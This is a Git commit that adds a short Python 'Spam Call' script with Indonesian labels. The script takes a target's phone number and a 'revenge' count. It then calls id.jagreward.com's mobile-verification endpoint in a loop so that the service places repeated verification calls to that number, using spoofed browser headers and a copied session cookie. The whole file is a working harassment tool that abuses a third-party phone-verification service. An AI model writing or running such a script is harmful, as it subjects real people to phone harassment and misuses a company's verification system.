bd5d8315f8f7e4cea6272adc4b3ff4e0764cc307
safar126 <49516594+safar126@users.noreply.github.com>
2020-07-22 18:22:36 +0700

    Add files via upload

---
+++ SpamCall.py
@@ -0,0 +1,29 @@
+import os, requests, json
+from requests import post
+print ("Code : Safar/Cupu\nFriends : Isi Sendiri\nTools : Spam Call\nNB : Limt 3 x / Hari")
+print('=' *30)
+
+no = input("NoPe|Ex8228823****: ")
+mak = int(input("Jumblah Dendam: "))
+url = "https://id.jagreward.com/member/verify-mobile/"+no
+hed = {
+    "X-Requested-With": "XMLHttpRequest",
+"User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
+"Content-Type":" application/x-www-form-urlencoded; charset=UTF-8",
+"Content-Type": "application/json",
+"Origin": "https://id.jagreward.com",
+"Referer": "https://id.jagreward.com/member/register/",
+"Accept-Encoding": "gzip, deflate, br",
+"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+"__cfduid": "d4de1e7ea2ced09ecde54a568af1ac50b1584709816",
+"_ga": "GA1.2.2037151396.1584709855",
+"PHPSESSID": "n88pmtvvsdpf25898a9jeqbggc",
+"DAPROPS": "sjs.webGlRenderer:PowerVR Rogue GE8320|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdevicePixelRatio:1.75|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:1|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0",
+}
+res ={ "method": "CALL",
+"countryCode":"id",
+}
+for x in range(mak):
+	#try:
+		s = requests.get(url,data=res, headers=hed).text
+		print(s)
